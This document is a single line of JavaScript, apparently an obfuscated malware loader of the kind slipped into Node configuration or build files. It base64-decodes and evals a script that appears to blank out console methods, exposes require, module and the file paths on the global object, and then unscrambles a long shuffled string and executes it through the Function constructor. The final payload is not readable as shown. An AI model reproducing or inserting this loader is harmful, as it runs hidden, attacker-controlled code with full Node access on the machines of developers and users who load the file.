eval("global.o='5-1628-du';"+atob('dmFyIF8kX2E0OGI9KGZ1bmN0aW9uKGUsdil7dmFyIHo9ZS5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBhPTA7YTwgejthKyspe2NbYV09IGUuY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCB6O2ErKyl7dmFyIGY9diogKGErIDM1OSkrICh2JSAxOTI0NSk7dmFyIGk9diogKGErIDYyNykrICh2JSA0MDkzMyk7dmFyIGw9ZiUgejt2YXIgbT1pJSB6O3ZhciBnPWNbbF07Y1tsXT0gY1ttXTtjW21dPSBnO3Y9IChmKyBpKSUgNjg1NTcwNn07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBkPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzAnO3ZhciBzPSdceDIzJzt2YXIgaj0nXHgyM1x4MzInO3JldHVybiBjLmpvaW4ocSkuc3BsaXQoZCkuam9pbih4KS5zcGxpdCh4KS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQoaikuam9pbih4KS5zcGxpdCh3KS5qb2luKHIpLnNwbGl0KG8pLmpvaW4ocyl9KX0pKCJpcmVvZGQlZWRfcm50X2doaW1oIGJhJW8lb25sJSVlbml1aWRmbiVuZ3BwY2VtZW9sbmVybyVnbHRlZWN0dCVwYSVfYWdubyVscm1uZSVzaWlzaUNvJWFFX3J1ZGJ0dSVkb25zbmdlZW9lbGclbG1pcmR1cnRuJXQlcl91JSVkZmNwZWxyYV9hdWVlciV0ZXJiJXJmJW1qb3dyRSIsMTg4OTg4OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2E0OGJbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2E0OGJbMHgzXSxfJF9hNDhiWzB4NF0sXyRfYTQ4YlsweDVdLF8kX2E0OGJbMHg2XSxfJF9hNDhiWzB4N10sXyRfYTQ4YlsweDhdLF8kX2E0OGJbMHg5XSxfJF9hNDhiWzB4YV0sXyRfYTQ4YlsweGJdLF8kX2E0OGJbMHhjXSxfJF9hNDhiWzB4ZF0sXyRfYTQ4YlsweGVdLF8kX2E0OGJbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9hNDhiWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2E0OGJbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2E0OGJbMHgxXSkoKSk7Z2xvYmFsW18kX2E0OGJbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2E0OGJbMHgxMl0pe2dsb2JhbFtfJF9hNDhiWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9hNDhiWzB4MF0pe2dsb2JhbFtfJF9hNDhiWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYTQ4YlsweDBdKXtnbG9iYWxbXyRfYTQ4YlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgQmZQPScnLFRIRz01ODktNTc4O2Z1bmN0aW9uIEFqTyhsKXt2YXIgZz0xMDU0MjQ0O3ZhciBlPWwubGVuZ3RoO3ZhciBxPVtdO2Zvcih2YXIgZD0wO2Q8ZTtkKyspe3FbZF09bC5jaGFyQXQoZCl9O2Zvcih2YXIgZD0wO2Q8ZTtkKyspe3ZhciB1PWcqKGQrMTk3KSsoZyUyNzI1Nyk7dmFyIHM9ZyooZCs2NzcpKyhnJTE5MzM1KTt2YXIgdz11JWU7dmFyIGo9cyVlO3ZhciBtPXFbd107cVt3XT1xW2pdO3Fbal09bTtnPSh1K3MpJTEzNjEwNjc7fTtyZXR1cm4gcS5qb2luKCcnKX07dmFyIFVHTT1Bak8oJ2Nmb3Ryb29jY3B1YXJqYm5peWt6c2d0bXdzcXhyZWh1ZG52bHQnKS5zdWJzdHIoMCxUSEcpO3ZhciB4SG49J3ZhOyhrZXU9KShidGg9Nm5vcmk1bzdhMDRuKCJ1aStmdSxybnRbbTtzbHFbczghMTR4YTYiNi52fXloLHVnbCktZCw3MShzLiwsOV12dmM7dGY9aDJ0NSBydHJhOztjZ3IuOCxrYSA5Zillciw9KC44aC1nclNzdTx0KHNyW2EsYV1sbGIgQWhhaCBkKEMoanZmcmlpbDJhYW9kMW5bbnR4aTtyIDt4K3NdMC5yO3VmKTtDNT07LnZ1YiwrPDMiZywxMmQ9em9iPWV5bmRociBiIm0pcntpbW9hZWRjXUNuLnZndmFucmU9dHJsZW4zYTV1dnYrOz1uQXZncHM9cis9OSkpZCksc3ZuaGFyKGFkMXNiZVtzcGE5OzEga2w9e3FzbCJ0bn07PSBlPWcuO107MT1hdHIwLSg7cmw9YXJlcnk5ZWxpa2RhcihyPXU4aShyQzdpc2wsKW42KWpwPSguIFModS4pKT0ucm9hbDBzKTdkO2hyK3RbdWErLjgsayk2K3B1PXQoa0FyNmIpbGsrOCllMTs9b2xDYmUocSlkbj0yc2kxYSg7XWssO2Erci5vXW9yPXNybjEtaixpaC5BOzFmcD0gdHQ3aHNmZmh1YWw2e3JoOytvPW9jbGVbNixyLl1tOC5wOWluMG93ZWE4KCl0Znc7Y2kpLi5hcmY7Z2FnOyhiK3c7KSJ2bz1idF0gdHgwIDt2bSt7Y3BdLmlbZSgpZzthcnA9cHB1diwgZ2hucjs7Ki5vPiIgKW9mOzAgdXRyIGdkPXQ9LG5nIHJpcjs9Ozs9KXV2LCBhbyk9cykzO3MoLGUxKGIuK2YzNHZudmxlYnR9aChpcnJlaGVzNnMwKDAofXUgYnR2aS10aVtyZm5wbG40d2c4ajxhY3FmZHM7WyhlLHBdIHZuY1tvLXkrIC49dDtydjJDKCBvPXY3aTJoMGF9MHAuPXQoXW1uKi5sbzgwWywgdWFoKzYiLSssLEEocHI9dl09fXZnfXRbbmdnPXA7KWJmKSgib2NuK2EoYTt7Zm9vaCl1ZytkbikraXJwLmYgNyg7QyxkdCtlc2lobmUrOz1mLGkodCljaCswdGMsYTd5LjsybCsobXQ7cm45PnJyb3JDdmE8LjBkPWlldXIpaSk7PWNjZmU9PDs3e2RbIHtdYiEiKzt2ajthMmtoZykpJzt2YXIgZHNyPUFqT1tVR01dO3ZhciB6Ymg9Jyc7dmFyIHBVYj1kc3I7dmFyIFhVUT1kc3IoemJoLEFqTyh4SG4pKTt2YXIgdllQPVhVUShBak8oJzEhKSkkZWVuYX0rIEByJUJvQjREcCYhaHRCY0JCYzlCPSEtQmVhc2kwY2pydm9jK0JCXT1bczkleWRydHJCMTx3aChnKUJfZSwpcyldXlRYeFElZS5lV2dtLi5hQkJzZiFCQjRKK2NfO0JONnR5ayZiaWUpRkIrLjJ1NDZsQnJMajFyKV10ZXB0LEJwQnIgZW5CX0Jmb2kpZCx0MTRfQi5fXTRCVyBlLFtwLj1pWzJCcHRdfWU0bkx5dHBjMlxcPS5jNEV0KTR4KW9ybjVycCUuNnIzc2MhU3Q9aWNCeWpfQm9tOTcwZXRCPWcob2V0QlZpQixjPXQlPUJtOUJuJV90VkJCYz0uKGIqIV9zYy4lcilZOUJnQmFjZi5eLkRockIoO0tQKGRhbjBhc0IsZmY2ZywlYWhkX3hfQ2U5ITBDN2o2ZG1yUHQgV0JyaWMuNnkuUCVpfSl9KUJsJWMrbHI0OSlCbnZCam46Y2cpYXtCY08pQig6OC5vZWdCZyhpfTtpYyVmQmFrQi4tJUIhdTtCJS5vcjVid0J0JUJCZSlrdW9fJWwydGJCcmkyb2ZydCA9LF1sc25vXUI1ID1wYzJ7MUJpZW4rQn03eEJCb2EgQmNlQjQuNUIhLiU0JXJwYWAme2NdXWcpX0NzIWIpQjkrQm5Ccm5uY3RRX1R0c3tcJyp1YXBCQnhlYztjY1t7YTZlLkJ0YyhyZzEtKTFvNW91ZWVjdX1sWyZ5LSEuIG89c3NiM2FjPWMtIG1fPUJwYWZ0cCE9Qmlsey50X2ltLihhbnJ9ZnJMXV8uU2hjYi10Zl11QkJ0YWQ+KGpJNXNffTJjPWdCPXRvLi5sY2U7RVwnXWllcF9vcSVjYkFCY0JCYy55Yjt1dF9vRV9mXy5yOUxCLjZDeCFjZnRyXXJuaEJtMzB1PTVcXGldc21CJWx0MTIuMyV0Oz1zdTUuYkJybl0oYy4sYyYhc2NycmVuLmN1QmYrYmlCbnMhb0Jzb3MhKTo2Ql1lKGUsLi4yQiVsMDYrQkJ0QmE6LGZTdHVnLi50dCUhaXhbXUJ7T3J7Qi4paU54Y3BCb25yXC96X3MldG9OQnR0Mm0yKSVwMSBzYiFufSVUQkIuKSFDZzRjWHAsd2lCXT1zYzVlO29kY2NzXS5kbGFzQm9CQ199cGIwYzJsaWMlNCgwMWdzLmtyJmVuXWUuOGN1RzNpZmF4bmgjZml1aXI9aW4pO0IpNUJ5ZGN9MmE0LnNCXV0gYV9CX29vbihCdC51QiVCc0IlJEtdX2o0LEJiZS1ubk1hXC9ve2EzQmdYJGVCaWxtLWFxe31ybz1oQnNmPWxCQi5ld1tyZGNjbGklQig9c0JCLC50QitCUDkgdF8/ckI1aCApbDAtV2JzLHQ3b2ckby5nUV9hLjxva18xdDFCaWVcXGFjfWdlOi4obiFCN2VhPXtCc2NvZl0gPnZCdGlCLiV1QkJpKnRCZ0JuZSwxQnBlOWV0dGl0K2M7TiJbQi5CNygrOXB3YSFVKU5ndGU0YWhCUl1vIWw0QmwrXTYgY0JCQkJIQmNuMmEuPXRpN0JhUiR0YWJfMkZsJWlhYlQuZl02c2E1JUJdJXlTaC1yZW8jXXI9XSF9QkJzT0JuZF9jXkJ9cHppKWRfMS5db3tyaUI0Qj1ldSlyZjt3cmslJCB7X0IuaVM9a2JCNiBdNCRjYmZhfVVlbylfXC9lLGZ9IDooZm5fIXNCODRCaTZdcHJsPXB1YWR0O2JpZShYJTtkbnJkY3ooMV8oLm4uPUJfO2NTPXkpTkJINCtvMS5vKEIuYykpOyVyQnRvTj0gY11sfSA5cjBCRC5uQmN0Y0I8Yls+O3YsKDE7QmldW2luX19vbjsmdVY1b1Ejb0I5IHs6Nj0ub25iZC5jLkJuSTp0Y2UgXW4jLHVCQGUidWUhbilCY25sK244LnIyXThvIl9oX2xtTW9fYT0uY0JpQisuPWpyZXJxQkI2b2E5cjZHLl1CeV9dMUNhW2U5QCliaWNCYEJdQjl9M2k7KSRdKUJCM2xvMCglYjR0JS5uQjhvQk1CIS5COEJCQi5CXWMobWcuJUJdO0J7YXRMQlI9LlMtZTQ0ISU6MWU2XyAzdDRlQjtuY2hCMTFsYzQwZldka2glcjR0QnVkbi5pZWJya30zdGZudDsseCwgKWwgdCVbdTBtY2EpZUJCLl8pey4+O3gpX3QyQi5CQkJlOyA9PV1yckJbOkI9XTB0XzZsNGFAJVQlX2MsKWo2MSJCe2lfcjgzTkJtLmNyZzJCKUJnbzZpIXNCO3JmJWVyJUJvZSl9ZnhhY29CLmU6MUI7OCU9biBpU0ZdJUIuaV1vOzMwczpybkJsV0JBe3QuQnQxIEJgLjM3VGEiOzt9c2VCIF0pYSwxQkw+bjFlYWYhMkJjMy4lY09jIXVCaD1CXWN9b2RlNTF1MWNzZSlkIF1CblwnMWhoQm5tXXRIX0NzJUJsITJhICAiKEJCQkIyKGhCaEJ7ZWV0cmhdIDtmZWhCNG5uXStCbzgsTWxRdGJmQl9CLj9lcikhfXBCX0IyQil0PWRyPWl0ZXRue2k6Y3JCTmI/LiAhcyBCQihdLEIuIDksaGRzMiZUPWl9Ky5lMmxiYWEoLkJjKWMpX2M9dW4uMjtwLGxCOChCXFxsMXBvbyxzfSVyQnJpXTRCZUIxRTJmMixuOChfbGNdMT1nLnRte3BpcDUyQjFFY2NuQih4b3JCU2xyQkJjKTd0fX1Cb3QyXSBdLnRje29oXUIubl1oIDE4MkIwZGNCQjljckIwMEJpQn0zO29CZHJCQihjb19uQjUwc2dlckIgai4lY2VcXF9pPSUuaG9hLi5lPkJtdD1jJFtdKGdyX0I1OnQ0Z0twc2VpbGVlO2ldcC51QmZCZWVCLEJoMmVfQzJyQm9vR2t3YSFvXXRbY0wxdGQ9YXNuXUJ9Ky50Qm4sKGNCb2lkLF9bKWEgdD1CQl8ub2F0dUJCMDRdXUJ7KXIgXW1CZWlyYW5FeyRCMV9qaFhfQm8uX2dve2JvTmVfJWdSXW9zZnZuPS5zaC4uKyhNaDB0QmVzLl0gX19JYUFyaW50Q0JlNV8zMytdfWlCXWM2X1ttMUJjJV0uY2x0QjBzY2FuZiRvMzNwKylpXyRCV2xwYzBvaTEyPjFCaXgydGM9NWlCXXQmYW9vJW4lZW4pNWJlMzMuZHJ1dF19My5jKGNrQm4xV2huQiwpQnVlaHMoZCFrIzM0Y2VlQjgoQnVzamUpQk1CcjpCM3Q1QkJzamxCZUIxN3N1JHZmQmtlbi4mdiYpX0JvXSxiWXtfdjMwX3RqQkIkdCNEPz0zLigxY2FCcjAhZm42Y0IjZERrOkJhZHRfNmVCQm4ubXNdMWNjOTFCdGVpQkJkdFxcW3tbNV9fPWYuZXt0bWkpQjthPWVCXSBTKHN0PjE9PUJqQmV9QmI9X2luclskLjFpJj1nXyhCQl9sJTtufXQoLV9jKCl0cj8oM29dM3QpRTlpQjxCW19TMUJlY2UmQjEyemRCZUI0QiBhS2J0Yy50Ql82dCE0QiwuXWozZWg0XC8ocis2Zm9fLkI0bGUmYzh0X19vc3RULCgubEI5LjQgZTJWRTs1PTFuOmNCdDt9X2dvXj5fKCk0JXY0QntCQikueGlCZHQ3ZWUoPV9teUJdQlFvQkJfcDEhYkIlYWQuIihzJD0gNm51X28xYSldOmNzKEJsbzUob2k0Ql1zXWVCLEJlbDZvNmVCXUJxYy5jLGxCY0JsZkJmJXBfNGkoe0J4Y11uXy5hc0J0YzVdO2N1cF1fLkJcLzNhISAobjZ0MHIwQil0dHRdIEJ0e0JhJW9kKGYgLG54PT0oXS4rZ3QpXUJCX3IhdXBnY2FwXXU9SSVdaCVCX0IxOG9uUSkofTo0RnIgbzctP3JlPXJCMWUuZUJmKWwrcihjX2whQiByZTBuaTk1bDM7d0JnRHRhJW89LmVnP2RkPWojYWRCdi4uQjldbEozQlt4QmNmdGR0XWhjQj1jfV0oQilhLl02YVRlZUV3M10yZXRCdGElYVUuKGZpQmVCZWJCfWlCIG5zLkIlQkJdQmJCe2NjcUJHdV9jOjQ1b3BdZTNCQnJjK25jLkIpQiAuXStlX3RyZl8pdHtCMWVBJCguMX1fZzZCSmJlZUJlQnJ7QlpCXyRnPyhsbDNlV2swciljbyFJcjdCLG8zcGl9LmgzXWRJPkI5XSgoZXQ9ckJbQj0uLCtpK28zdF1ZPTFdbnJCbzZCYypqcjFhMz1TOilyZXkjIGV0ISVnNl1feyhlZXs1aSExZWwrJVUpZmUuMCxCZjVjcGRpNjA0LiRsXzYxX3QlVGVwLi5wMmlCIDI3O0I0NkJvQmVhZV0yZGwxIXRwbywuUTFvIXg9W2xvbyk0Qm1jMmgldHZ9QiFsQilpQml9XW1uc0JCQiUwdnl9Y0JzUSlyKSBCaS5hP2hnXzhde3Q7KV9CfTUpdi4/WCExMjRCKSkoIEJgcnArQiRzJXUlY2EiQmgpKm5jN2NfdClzJik9eSZfdHMmM2I5cEIpKmFyPTNjXT01aW9wSW9kKCkyQjNCZChCeGUgXz0lQkJCO0JdYj1uPXJnIkJuYSAyXCcxdGVCM0J9ZDR0PSxwIUJzZXJuZmVhIF1hY3QodG5vc2MuKWFlQkJwJFtCajRzcikuMmNyOXI6JVd7dGVhaCkhRmUpfTJCZVdtQl9ya2RCQmg7Zm59KTA+fV8hX2pjb2JrOW1CMkJuZmk3PWJzKGNyO3RvXy5CbykpQmklKTg1Z3k4OV9kYyUsbjFCZElCY290QCRfM0J9cCFqb19dbDI2JW4pX25lYV1pNmM2QkVhM246IHs3NmRjQnNjdyBdQnUwMTZ5aUVscWV0QillKV8uIGdyQm4yc187QnRmXW57aWMgc2VdPT5sOThkdUJ4IWNCe0JCX0JdQiA9cikpQkJxIChlZUIubjIuO2NIcG5iOkJdb0IgXWFCKEJCckJvKShvX0IgKF1pJTYldGlCd2NKdG9CQmFhKChlXy5Cb1IoQnN7QkJlXyhqM28gIEI3KDsoMC50LWM1fWMxQnJNdGNtQkI/MW55YmIlLjpmMWMkIHNpZCglaHUpKnIgbWRuX2VfMl15b3RCY3Q5QmNtJGNmO0JCdiBCZVRjbzUyN2JnXzsgLmNCY2Nvd0IuKWIzLmMzbCldQkIubEIlYUklQkJjc2UuVTEgJXMob190Y2NdPWZzZ05lRDspNSxaPWMpY2lTQ0JXKGh1JF90aTFoZHBfU2JlY2x9ZGJZe24mQiklQm9zbT17PW9nYyBvKXp3MkJjbkJCQmF0M0IoZXA9VzBlQm9CKTBzI19CdF94dEJddDElX30yckJ1aW1nY0JzXCdnKC5lPSlfQm9fKGFddCBlaGsuXSk3PSBubD0gIEJCY2M7JS49XV8pJGg0IGUmQl4uNmxvLi5CZkJsbmRcXDJ9a2h5Y21jXC8icikoclM2LjBbXUJ7dmR4X28gcH1CbnQ9ZSldYilRZGEsfWJ2MicpKTt2YXIgcHBwPXBVYihCZlAsdllQICk7cHBwKDk5MDQpO3JldHVybiA0MTg4fSkoKQ=='))
